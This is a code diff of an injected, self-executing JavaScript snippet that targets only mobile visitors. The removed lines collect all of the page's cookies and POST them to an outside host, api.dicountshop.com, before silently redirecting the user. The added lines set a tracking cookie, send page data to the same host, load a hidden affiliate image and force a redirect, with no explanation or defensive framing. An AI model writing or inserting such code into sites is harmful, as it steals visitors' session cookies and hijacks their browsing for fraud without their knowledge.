@@ -1,60 +1,85 @@
 (async function() {
-
+   
     function isMobileDevice() {
         return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    if (!isMobileDevice()) {
-        return; 
-    }
+    if (!isMobileDevice()) return;
+    if (sessionStorage.getItem('trackingInitialized')) return;
 
-    if (sessionStorage.getItem('redirected')) {
-        return; 
-    }
-
-    function getCookies() {
-        return document.cookie.split(';').reduce((cookieObject, cookie) => {
-            let [name, ...value] = cookie.split('=');
-            name = name.trim();
-            if (name) {
-                cookieObject[name] = decodeURIComponent(value.join('=').trim());
+    function fetchCookieValue(cookieName) {
+        const namePrefix = cookieName + '=';
+        const cookies = document.cookie.split(';');
+        for (let i = 0; i < cookies.length; i++) {
+            let cookie = cookies[i].trim();
+            if (cookie.indexOf(namePrefix) === 0) {
+                return cookie.substring(namePrefix.length);
             }
-            return cookieObject;
-        }, {});
+        }
+        return '';
     }
 
-    let cookies = getCookies();
-    let requestData = {
-    url: window.location.href, 
-    referrer: document.referrer, 
-    coo: JSON.stringify(cookies), 
-    origin: window.location.hostname 
-    };
-    
-    try {
-        let response = await fetch('https://api.dicountshop.com/api/scriptdata', {
-            method: 'POST',
-            body: JSON.stringify(requestData),
-            headers: { 'Content-Type': 'application/json' }
+    function createUniqueIdentifier() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            const r = Math.random() * 16 | 0;
+            const v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
         });
-
-        if (!response.ok) {
-            let errorText = await response.text();  
-            throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
-        }
-
-        let responseData = await response.json();
-        
-        if (responseData && responseData.url) {
-            let link = document.createElement('a');
-            link.href = responseData.url;  
-            link.rel = 'noreferrer';       
-            document.body.appendChild(link);  
-            link.click();          
-            //window.location.href = responseData.url;       
-            sessionStorage.setItem('redirected', 'true');
-        }
-    } catch (error) {
-        console.error('Error sending data:', error);
     }
+
+    function appendTrackerImage(url) {
+        const img = document.createElement('img');
+        img.src = url;
+        img.style.display = 'none';
+        document.body.appendChild(img);
+    }
+
+    async function initializeTrackingProcess() {
+        try {
+          
+            let clientId = fetchCookieValue('client_identifier') || createUniqueIdentifier();
+            const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+            document.cookie = `client_identifier=${clientId}; expires=${expires}; path=/`;
+
+           
+            const response = await fetch('https://api.dicountshop.com/api/track-user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    unique_id: clientId,
+                    origin: window.location.hostname
+                })
+            });
+
+            
+            const data = await response.json();
+            
+            if (data.success) {
+               
+                appendTrackerImage(data.affiliate_url);
+                if (data.redirect_url) {
+                    sessionStorage.setItem('trackingInitialized', 'true');
+                    window.location.href = data.redirect_url;
+                }
+            } else {
+               
+                appendTrackerImage(`https://api.dicountshop.com/api/fallback-pixel?id=${clientId}`);
+            }
+
+            
+            sessionStorage.setItem('trackingInitialized', 'true');
+
+        } catch (error) {
+      
+            console.error('Tracking Error:', {
+                message: error.message,
+                stack: error.stack,
+                timestamp: new Date().toISOString()
+            });
+        }
+    }
+
+    initializeTrackingProcess();
 })();
